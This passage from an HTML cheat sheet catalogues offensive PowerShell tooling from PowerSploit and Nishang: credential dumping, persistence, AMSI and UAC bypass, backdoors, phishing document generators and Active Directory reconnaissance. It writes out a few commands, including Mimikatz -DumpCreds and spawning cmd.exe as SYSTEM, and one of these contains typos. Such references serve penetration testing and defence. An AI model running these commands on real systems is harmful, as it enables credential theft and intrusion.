<li><code class="codehilite"><span class="n">Invoke</span><span class="o">-</span><span class="n">Shellcode</span></code>Injects shellcode into the process ID of your choosing or within PowerShell locally</li>
<li>.<code class="codehilite"><span class="n">Invoke</span><span class="o">-</span><span class="n">WmiCommand</span></code>Executes a PowerShell ScriptBlock on a target computer and returns its formatted output using WMI as a C2 channel.</li>
</ul>
</li>
<li>ScriptModification<ul>
<li><code class="codehilite"><span class="k">Out</span><span class="o">-</span><span class="n">EncodedCommand</span></code>Compresses, Base-64 encodes, and generates command-line output for a PowerShell payload script.</li>
<li><code class="codehilite"><span class="k">Out</span><span class="o">-</span><span class="n">CompressedDll</span></code>Compresses, Base-64 encodes, and outputs generated code to load a managed dll in memory.</li>
<li><code class="codehilite"><span class="k">Out</span><span class="o">-</span><span class="n">EncryptedScript</span></code>Encrypts text files/scripts.</li>
<li><code class="codehilite"><span class="n">Remove</span><span class="o">-</span><span class="n">Comments</span></code>Strips comments and extra whitespace from a script.</li>
</ul>
</li>
<li>Persistence<ul>
<li><code class="codehilite"><span class="k">New</span><span class="o">-</span><span class="n">UserPersistenceOption</span></code>Configure user-level persistence options for the Add-Persistence function.</li>
<li><code class="codehilite"><span class="k">New</span><span class="o">-</span><span class="n">ElevatedPersistenceOption</span></code>Configure elevated persistence options for the Add-Persistence function.</li>
<li><code class="codehilite"><span class="k">Add</span><span class="o">-</span><span class="n">Persistence</span></code>Add persistence capabilities to a script.<code class="codehilite"><span class="n">Install</span><span class="o">-</span><span class="n">SSP</span></code>Installs a security support provider (SSP) dll.</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">SecurityPackages</span></code>Enumerates all loaded security packages (SSPs).</li>
</ul>
</li>
<li>AntivirusBypass<ul>
<li><code class="codehilite"><span class="n">Find</span><span class="o">-</span><span class="n">AVSignature</span></code>Locates single Byte AV signatures utilizing the same method as DSplit from "class101".</li>
</ul>
</li>
<li>Exfiltration<ul>
<li><code class="codehilite"><span class="n">Invoke</span><span class="o">-</span><span class="n">TokenManipulation</span></code>Lists available logon tokens. Creates processes with other users logon tokens, and impersonates logon tokens in the current thread.<ul>
<li><code class="codehilite"><span class="n">Invoke</span><span class="o">-</span><span class="n">TokenManipulation</span> <span class="o">-</span><span class="n">CreateProcess</span> <span class="ss">&quot;cmd.exe&quot;</span> <span class="o">-</span><span class="n">Username</span> <span class="ss">&quot;nt authority\system&quot;</span></code></li>
<li><code class="codehilite"><span class="n">GetProcess</span> <span class="n">lass</span> <span class="o">|</span> <span class="n">Invoke</span><span class="o">-</span><span class="n">TokenManipulation</span> <span class="o">-</span><span class="n">ImperrsonateUser</span></code></li>
</ul>
</li>
<li><code class="codehilite"><span class="n">Invoke</span><span class="o">-</span><span class="n">CredentialInjection</span></code>Create logons with clear-text credentials without triggering a suspicious Event ID 4648 (Explicit Credential Logon).</li>
<li><code class="codehilite"><span class="n">Invoke</span><span class="o">-</span><span class="n">NinjaCopy</span></code>Copies a file from an NTFS partitioned volume by reading the raw volume and parsing the NTFS structures.<ul>
<li>Copy from NTDS.dit, SYSTEM, SAM Hive</li>
</ul>
</li>
<li><code class="codehilite"><span class="n">Invoke</span><span class="o">-</span><span class="n">Mimikatz</span></code>Reflectively loads Mimikatz 2.0 in memory using PowerShell. Can be used to dump credentials without writing anything to disk. Can be used for any functionality provided with Mimikatz.<ul>
<li><code class="codehilite"><span class="n">Invoke</span><span class="o">-</span><span class="n">Mimikatz</span> <span class="o">-</span><span class="n">DumpCreds</span></code></li>
<li><code class="codehilite"><span class="n">Invoke</span><span class="o">-</span><span class="n">Mimikatz</span> <span class="o">-</span><span class="n">DumpCerts</span></code></li>
</ul>
</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">Keystrokes</span></code>Logs keys pressed, time and the active window.</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">GPPPassword</span></code>Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.<ul>
<li>KB2928120</li>
</ul>
</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">GPPAutologon</span></code>Retrieves autologon username and password from registry.xml if pushed through Group Policy Preferences.</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">TimedScreenshot</span></code>A function that takes screenshots at a regular interval and saves them to a folder.</li>
<li><code class="codehilite"><span class="k">New</span><span class="o">-</span><span class="n">VolumeShadowCopy</span></code>Creates a new volume shadow copy.</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">VolumeShadowCopy</span></code>Lists the device paths of all local volume shadow copies.</li>
<li><code class="codehilite"><span class="n">Mount</span><span class="o">-</span><span class="n">VolumeShadowCopy</span></code>Mounts a volume shadow copy.</li>
<li><code class="codehilite"><span class="n">Remove</span><span class="o">-</span><span class="n">VolumeShadowCopy</span></code>Deletes a volume shadow copy.</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">VaultCredential</span></code>Displays Windows vault credential objects including cleartext web credentials.</li>
<li><code class="codehilite"><span class="k">Out</span><span class="o">-</span><span class="n">Minidump</span></code>Generates a full-memory minidump of a process.</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">MicrophoneAudio</span></code>Records audio from system microphone and saves to disk</li>
</ul>
</li>
<li>Mayhem<ul>
<li><code class="codehilite"><span class="k">Set</span><span class="o">-</span><span class="n">MasterBootRecord</span></code>Proof of concept code that overwrites the master boot record with the message of your choice.</li>
<li><code class="codehilite"><span class="k">Set</span><span class="o">-</span><span class="n">CriticalProcess</span></code>Causes your machine to blue screen upon exiting PowerShell.</li>
</ul>
</li>
<li>Privesc<ul>
<li><code class="codehilite"><span class="n">PowerUp</span></code>Clearing house of common privilege escalation checks, along with some weaponization vectors.<ul>
<li>Service Enumeration:<ul>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">ServiceUnquoted</span></code> - returns services with unquoted paths that also have a space in the name</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">ModifiableServiceFile</span></code> - returns services where the current user can write to the service binary path or its config</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">ModifiableService</span></code> - returns services the current user can modify</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">ServiceDetail</span></code> - returns detailed information about a specified service</li>
</ul>
</li>
<li>Service Abuse:<ul>
<li><code class="codehilite"><span class="n">Invoke</span><span class="o">-</span><span class="n">ServiceAbuse</span></code> - modifies a vulnerable service to create a local admin or execute a custom command</li>
<li><code class="codehilite"><span class="k">Write</span><span class="o">-</span><span class="n">ServiceBinary</span></code> - writes out a patched C# service binary that adds a local admin or executes a custom command</li>
<li><code class="codehilite"><span class="n">Install</span><span class="o">-</span><span class="n">ServiceBinary</span></code> - replaces a service binary with one that adds a local admin or executes a custom command</li>
<li><code class="codehilite"><span class="n">Restore</span><span class="o">-</span><span class="n">ServiceBinary</span></code> - restores a replaced service binary with the original executable</li>
</ul>
</li>
<li>DLL Hijacking:<ul>
<li><code class="codehilite"><span class="n">Find</span><span class="o">-</span><span class="n">ProcessDLLHijack</span></code> - finds potential DLL hijacking opportunities for currently running processes</li>
<li><code class="codehilite"><span class="n">Find</span><span class="o">-</span><span class="n">PathDLLHijack</span></code> - finds service %PATH% DLL hijacking opportunities</li>
<li><code class="codehilite"><span class="k">Write</span><span class="o">-</span><span class="n">HijackDll</span></code> - writes out a hijackable DLL</li>
</ul>
</li>
<li>Registry Checks:<ul>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">RegistryAlwaysInstallElevated</span></code> - checks if the AlwaysInstallElevated registry key is set</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">RegistryAutoLogon</span></code> - checks for Autologon credentials in the registry</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">ModifiableRegistryAutoRun</span></code> - checks for any modifiable binaries/scripts (or their configs) in HKLM autoruns</li>
</ul>
</li>
<li>Miscellaneous Checks:<ul>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">ModifiableScheduledTaskFile</span></code> - find schtasks with modifiable target files</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">UnattendedInstallFile</span></code> - finds remaining unattended installation files</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">Webconfig</span></code> - checks for any encrypted web.config strings</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">ApplicationHost</span></code> - checks for encrypted application pool and virtual directory passwords</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">SiteListPassword</span></code> - retrieves the plaintext passwords for any found McAfee's SiteList.xml files</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">CachedGPPPassword</span></code> - checks for passwords in cached Group Policy Preferences files</li>
</ul>
</li>
<li>Other Helpers/Meta-Functions:<ul>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">ModifiablePath</span></code> - tokenizes an input string and returns the files in it the current user can modify</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">CurrentUserTokenGroupSid</span></code> - returns all SIDs that the current user is a part of, whether they are disabled or not</li>
<li><code class="codehilite"><span class="k">Add</span><span class="o">-</span><span class="n">ServiceDacl</span></code> - adds a Dacl field to a service object returned by Get-Service</li>
<li><code class="codehilite"><span class="k">Set</span><span class="o">-</span><span class="n">ServiceBinPath</span></code> - sets the binary path for a service to a specified value through Win32 API methods</li>
<li><code class="codehilite"><span class="n">Test</span><span class="o">-</span><span class="n">ServiceDaclPermission</span></code> - tests one or more passed services or service names against a given permission set</li>
<li><code class="codehilite"><span class="k">Write</span><span class="o">-</span><span class="n">UserAddMSI</span></code> - write out a MSI installer that prompts for a user to be added</li>
<li><code class="codehilite"><span class="n">Invoke</span><span class="o">-</span><span class="n">AllChecks</span></code> - runs all current escalation checks and returns a report</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Recon<ul>
<li><code class="codehilite"><span class="n">Invoke</span><span class="o">-</span><span class="n">Portscan</span></code>Does a simple port scan using regular sockets, based (pretty) loosely on nmap.</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">HttpStatus</span></code>Returns the HTTP Status Codes and full URL for specified paths when provided with a dictionary file.</li>
<li><code class="codehilite"><span class="n">Invoke</span><span class="o">-</span><span class="n">ReverseDnsLookup</span></code>Scans an IP address range for DNS PTR records.</li>
<li><code class="codehilite"><span class="n">PowerView</span></code>PowerView is series of functions that performs network and Windows domain enumeration and exploitation.<ul>
<li>Misc<ul>
<li><code class="codehilite"><span class="n">Export</span><span class="o">-</span><span class="n">PowerViewCSV</span></code>- thread-safe CSV append</li>
<li><code class="codehilite"><span class="k">Set</span><span class="o">-</span><span class="n">MacAttribute</span></code> - Sets MAC attributes for a file based on another file or input (from Powersploit)</li>
<li><code class="codehilite"><span class="k">Copy</span><span class="o">-</span><span class="n">ClonedFile</span></code> - copies a local file to a remote location, matching MAC properties</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">IPAddress</span></code> - resolves a hostname to an IP</li>
<li><code class="codehilite"><span class="n">Test</span><span class="o">-</span><span class="n">Server</span></code> - tests connectivity to a specified server</li>
<li><code class="codehilite"><span class="k">Convert</span><span class="o">-</span><span class="n">NameToSid</span></code> - converts a given user/group name to a security identifier (SID)</li>
<li><code class="codehilite"><span class="k">Convert</span><span class="o">-</span><span class="n">SidToName</span></code> - converts a security identifier (SID) to a group/user name</li>
<li><code class="codehilite"><span class="k">Convert</span><span class="o">-</span><span class="n">NT4toCanonical</span></code> - converts a user/group NT4 name (i.e. dev/john) to canonical format</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">Proxy</span></code> - enumerates local proxy settings</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">PathAcl</span></code> - get the ACLs for a local/remote file path with optional group recursion</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">UserProperty</span></code> - returns all properties specified for users, or a set of user:prop names</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">ComputerProperty</span></code> - returns all properties specified for computers, or a set of computer:prop names</li>
<li><code class="codehilite"><span class="n">Find</span><span class="o">-</span><span class="n">InterestingFile</span></code> - search a local or remote path for files with specific terms in the name</li>
<li><code class="codehilite"><span class="n">Invoke</span><span class="o">-</span><span class="n">CheckLocalAdminAccess</span></code> - check if the current user context has local administrator access to a specified host</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">DomainSearcher</span></code> - builds a proper ADSI searcher object for a given domain</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">ObjectAcl</span></code> - returns the ACLs associated with a specific active directory object</li>
<li><code class="codehilite"><span class="k">Add</span><span class="o">-</span><span class="n">ObjectAcl</span></code> - adds an ACL to a specified active directory object</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">LastLoggedOn</span></code> - return the last logged on user for a target host</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">CachedRDPConnection</span></code> -  queries all saved RDP connection entries on a target host</li>
<li><code class="codehilite"><span class="n">Invoke</span><span class="o">-</span><span class="n">ACLScanner</span></code> - enumerate -1000+ modifable ACLs on a specified domain</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">GUIDMap</span></code> - returns a hash table of current GUIDs -&gt; display names</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">DomainSID</span></code> - return the SID for the specified domain</li>
<li><code class="codehilite"><span class="n">Invoke</span><span class="o">-</span><span class="n">ThreadedFunction</span></code> - helper that wraps threaded invocation for other </li>
</ul>
</li>
<li>net * Functions:<ul>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">NetDomain</span></code> - gets the name of the current user's domain</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">NetForest</span></code> - gets the forest associated with the current user's domain</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">NetForestDomain</span></code> - gets all domains for the current forest</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">NetDomainController</span></code> - gets the domain controllers for the current computer's domain</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">NetUser</span></code> - returns all user objects, or the user specified (wildcard specifiable)</li>
<li><code class="codehilite"><span class="k">Add</span><span class="o">-</span><span class="n">NetUser</span></code> - adds a local or domain user</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">NetComputer</span></code> - gets a list of all current servers in the domain</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">NetPrinter</span></code> - gets an array of all current computers objects in a domain</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">NetOU</span></code> - gets data for domain organization units</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">NetSite</span></code> - gets current sites in a domain</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">NetSubnet</span></code> - gets registered subnets for a domain</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">NetGroup</span></code> - gets a list of all current groups in a domain</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">NetGroupMember</span></code> - gets a list of all current users in a specified domain group</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">NetLocalGroup</span></code> - gets the members of a localgroup on a remote host or hosts</li>
<li><code class="codehilite"><span class="k">Add</span><span class="o">-</span><span class="n">NetGroupUser</span></code> - adds a local or domain user to a local or domain group</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">NetFileServer</span></code> - get a list of file servers used by current domain users</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">DFSshare</span></code> - gets a list of all distribute file system shares on a domain</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">NetShare</span></code> - gets share information for a specified server</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">NetLoggedon</span></code> - gets users actively logged onto a specified server</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">NetSession</span></code> - gets active sessions on a specified server</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">NetRDPSession</span></code> - gets active RDP sessions for a specified server (like qwinsta)</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">NetProcess</span></code> - gets the remote processes and owners on a remote server</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">UserEvent</span></code> - returns logon or TGT events from the event log for a specified host</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">ADObject</span></code> - takes a domain SID and returns the user, group, or computer object associated with it</li>
<li><code class="codehilite"><span class="k">Set</span><span class="o">-</span><span class="n">ADObject</span></code> - takes a SID, name, or SamAccountName to query for a specified domain object, and then sets a specified 'PropertyName' to a specified 'PropertyValue'</li>
</ul>
</li>
<li>GPO functions:<ul>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">GptTmpl</span></code> - parses a GptTmpl.inf to a custom object</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">NetGPO</span></code> - gets all current GPOs for a given domain</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">NetGPOGroup</span></code> - gets all GPOs in a domain that set "Restricted Groups" on on target machines</li>
<li><code class="codehilite"><span class="n">Find</span><span class="o">-</span><span class="n">GPOLocation</span></code> - takes a user/group and makes machines they have effective rights over through GPO enumeration and correlation</li>
<li><code class="codehilite"><span class="n">Find</span><span class="o">-</span><span class="n">GPOComputerAdmin</span></code> - takes a computer and determines who has admin rights over it through GPO enumeration</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">DomainPolicy</span></code> - returns the default domain or DC policy</li>
</ul>
</li>
<li>User-Hunting Functions:<ul>
<li><code class="codehilite"><span class="n">Invoke</span><span class="o">-</span><span class="n">UserHunter</span></code> - finds machines on the local domain where specified users are logged into, and can optionally check if the current user has local admin access to found machines</li>
<li><code class="codehilite"><span class="n">Invoke</span><span class="o">-</span><span class="n">StealthUserHunter</span></code> - finds all file servers utilizes in user HomeDirectories, and checks the sessions one each file server, hunting for particular users</li>
<li><code class="codehilite"><span class="n">Invoke</span><span class="o">-</span><span class="n">ProcessHunter</span></code> - hunts for processes with a specific name or owned by a specific user on domain machines</li>
<li><code class="codehilite"><span class="n">Invoke</span><span class="o">-</span><span class="n">UserEventHunter</span></code> - hunts for user logon events in domain controller event logs</li>
</ul>
</li>
<li>Domain Trust Functions:<ul>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">NetDomainTrust</span></code> - gets all trusts for the current user's domain</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">NetForestTrust</span></code> - gets all trusts for the forest associated with the current user's domain</li>
<li><code class="codehilite"><span class="n">Find</span><span class="o">-</span><span class="n">ForeignUser</span></code> - enumerates users who are in groups outside of their principal domain</li>
<li><code class="codehilite"><span class="n">Find</span><span class="o">-</span><span class="n">ForeignGroup</span></code> - enumerates all the members of a domain's groups and finds users that are outside of the queried domain</li>
<li><code class="codehilite"><span class="n">Invoke</span><span class="o">-</span><span class="n">MapDomainTrust</span></code> - try to build a relational mapping of all domain trusts</li>
</ul>
</li>
<li>MetaFunctions:<ul>
<li><code class="codehilite"><span class="n">Invoke</span><span class="o">-</span><span class="n">ShareFinder</span></code> - finds (non-standard) shares on hosts in the local domain</li>
<li><code class="codehilite"><span class="n">Invoke</span><span class="o">-</span><span class="n">FileFinder</span></code> - finds potentially sensitive files on hosts in the local domain</li>
<li><code class="codehilite"><span class="n">Find</span><span class="o">-</span><span class="n">LocalAdminAccess</span></code> - finds machines on the domain that the current user has local admin access to</li>
<li><code class="codehilite"><span class="n">Find</span><span class="o">-</span><span class="n">ManagedSecurityGroups</span></code> - searches for active directory security groups which are managed and identify users who have write access to those groups (i.e. the ability to add or remove members)</li>
<li><code class="codehilite"><span class="n">Find</span><span class="o">-</span><span class="n">UserField</span></code> - searches a user field for a particular term</li>
<li><code class="codehilite"><span class="n">Find</span><span class="o">-</span><span class="n">ComputerField</span></code> - searches a computer field for a particular term</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">ExploitableSystem</span></code> - finds systems likely vulnerable to common exploits</li>
<li><code class="codehilite"><span class="n">Invoke</span><span class="o">-</span><span class="n">EnumerateLocalAdmin</span></code> - enumerates members of the local Administrators groups across all machines in the domain</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Nishang <ul>
<li><a href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a> -  framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming</li>
<li>ActiveDirectory<ul>
<li><a href="https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1">Set-DCShadowPermissions</a>Modify AD objects to provide minimal permissions required for DCShadow.</li>
</ul>
</li>
<li>Antak - the Webshell<ul>
<li><a href="https://github.com/samratashok/nishang/tree/master/Antak-WebShell">Antak</a>Execute PowerShell scripts in memory, run commands, and download and upload files using this webshell.</li>
</ul>
</li>
<li>Backdoors<ul>
<li><a href="https://github.com/samratashok/nishang/blob/master/Backdoors/HTTP-Backdoor.ps1">HTTP-Backdoor</a>A backdoor which can receive instructions from third party websites and execute PowerShell scripts in memory.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Backdoors/DNS_TXT_Pwnage.ps1">DNS_TXT_Pwnage</a>A backdoor which can receive commands and PowerShell scripts from DNS TXT queries, execute them on a target, and be remotely controlled using the queries.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Backdoors/Execute-OnTime.ps1">Execute-OnTime</a>A backdoor which can execute PowerShell scripts at a given time on a target.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Backdoors/Gupt-Backdoor.ps1">Gupt-Backdoor</a>A backdoor which can receive commands and scripts from a WLAN SSID without connecting to it.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Backdoors/Add-ScrnSaveBackdoor.ps1">Add-ScrnSaveBackdoor</a>A backdoor which can use Windows screen saver for remote command and script execution.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Backdoors/Invoke-ADSBackdoor.ps1">Invoke-ADSBackdoor</a>A backdoor which can use alternate data streams and Windows Registry to achieve persistence.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Backdoors/Add-RegBackdoor.ps1">Add-RegBackdoor</a>A backdoor which uses well known Debugger trick to execute payload with Sticky keys and Utilman (Windows key + U).</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1">Set-RemoteWMI</a>Modify permissions of DCOM and WMI namespaces to allow access to a non-admin user.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemotePSRemoting.ps1">Set-RemotePSRemoting</a>Modify permissions of PowerShell remoting to allow access to a non-admin user.</li>
</ul>
</li>
<li>Bypass<ul>
<li><a href="https://github.com/samratashok/nishang/blob/master/Bypass/Invoke-AmsiBypass.ps1">Invoke-AmsiBypass</a>Implementation of publicly known methods to bypass/avoid AMSI.</li>
</ul>
</li>
<li>Client<ul>
<li><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1">Out-CHM</a>Create infected CHM files which can execute PowerShell commands and scripts.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-Word.ps1">Out-Word</a>Create Word files and infect existing ones to run PowerShell commands and scripts.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-Excel.ps1">Out-Excel</a>Create Excel files and infect existing ones to run PowerShell commands and scripts.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-HTA.ps1">Out-HTA</a>Create a HTA file which can be deployed on a web server and used in phishing campaigns.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-Java.ps1">Out-Java</a>Create signed JAR files which can be used with applets for script and command execution.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-Shortcut.ps1">Out-Shortcut</a>Create shortcut files capable of executing PowerShell commands and scripts.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-WebQuery.ps1">Out-WebQuery</a>Create IQY files for phishing credentials and SMB hashes.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-JS.ps1">Out-JS</a>Create JS files capable of executing PowerShell commands and scripts.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-SCT.ps1">Out-SCT</a>Create SCT files capable of executing PowerShell commands and scripts.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-SCF.ps1">Out-SCF</a>Create a SCF file which can be used for capturing NTLM hash challenges.</li>
</ul>
</li>
<li>Escalation<ul>
<li><a href="https://github.com/samratashok/nishang/blob/master/Escalation/Enable-DuplicateToken.ps1">Enable-DuplicateToken</a>When SYSTEM privileges are required.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Escalation/Remove-Update.ps1">Remove-Update</a>Introduce vulnerabilities by removing patches.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Escalation/Invoke-PsUACme.ps1">Invoke-PsUACme</a>Bypass UAC.</li>
</ul>
</li>
<li>Execution<ul>
<li><a href="https://github.com/samratashok/nishang/blob/master/Execution/Download-Execute-PS.ps1">Download-Execute-PS</a>Download and execute a PowerShell script in memory.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Execution/Download_Execute.ps1">Download_Execute</a>Download an executable in text format, convert it to an executable, and execute.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Execution/Execute-Command-MSSQL.ps1">Execute-Command-MSSQL</a>Run PowerShell commands, native commands, or SQL commands on a MSSQL Server with sufficient privileges.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Execution/Execute-DNSTXT-Code.ps1">Execute-DNSTXT-Code</a>Execute shellcode in memory using DNS TXT queries.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Execution/Out-RundllCommand.ps1">Out-RundllCommand</a>Execute PowerShell commands and scripts or a reverse PowerShell session using rundll32.exe.</li>
</ul>
</li>
<li>Gather<ul>
<li><a href="https://github.com/samratashok/nishang/blob/master/Gather/Check-VM.ps1">Check-VM</a>Check for a virtual machine.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Gather/Copy-VSS.ps1">Copy-VSS</a>Copy the SAM file using Volume Shadow Copy Service.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Gather/Credentials.ps1">Invoke-CredentialsPhish</a>Trick a user into giving credentials in plain text.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Gather/FireBuster.ps1">FireBuster</a> </li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Gather/FireListener.ps1">FireListener</a>A pair of scripts for egress testing</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Gather/Get-Information.ps1">Get-Information</a>Get juicy information from a target.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Gather/Get-LSASecret.ps1">Get-LSASecret</a>Get LSA Secret from a target.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Gather/Get-PassHashes.ps1">Get-PassHashes</a>Get password hashes from a target.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Gather/Get-WLAN-Keys.ps1">Get-WLAN-Keys</a>Get WLAN keys in plain text from a target.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Gather/Keylogger.ps1">Keylogger</a>Log keystrokes from a target.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Gather/Invoke-MimikatzWDigestDowngrade.ps1">Invoke-MimikatzWdigestDowngrade</a>Dump user passwords in plain on Windows 8.1 and Server 2012</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Gather/Get-PassHints.ps1">Get-PassHints</a>Get password hints of Windows users from a target.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Gather/Show-TargetScreen.ps1">Show-TargetScreen</a>Connect back and Stream target screen using MJPEG.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Gather/Invoke-Mimikatz.ps1">Invoke-Mimikatz</a>Load mimikatz in memory. Updated and with some customisation.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Gather/Invoke-Mimikittenz.ps1">Invoke-Mimikittenz</a>Extract juicy information from target process (like browsers) memory using regex.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Gather/Invoke-SSIDExfil.ps1">Invoke-SSIDExfil</a>Exfiltrate information like user credentials, using WLAN SSID.</li>
<li><a href="https://github.com/samratashok/nishang/blob/master/Gather/Invoke-SessionGopher.ps1">Invoke-SessionGopher</a>Identify admin jump-boxes and/or computers used to access Unix machines.<ul>
<li>Extract information from Putty and RDP (ppk, rdp, stdid)</li>
<li>Decrypt passwords for WinSCP from registry </li>
<li>"Admin" required for remote operations  </li>
<li>"-ExcludeDc" to prevent detection</li>
</ul>
</li>
</ul>
</li>
<li>MITM<ul>
<li><a href="https://github.com/samratashok/nishang/blob/master/MITM/Invoke-Interceptor.ps1">Invoke-Interceptor</a>A local HTTPS proxy for MITM attacks.</li>
</ul>
</li>
<li>Pivot<ul>
<li><a href="https://github.com/samratashok/nishang/blob/master/Pivot/Create-MultipleSessions.ps1">Create-MultipleSessions</a>Check credentials on multiple computers and create PSSessions.</li>
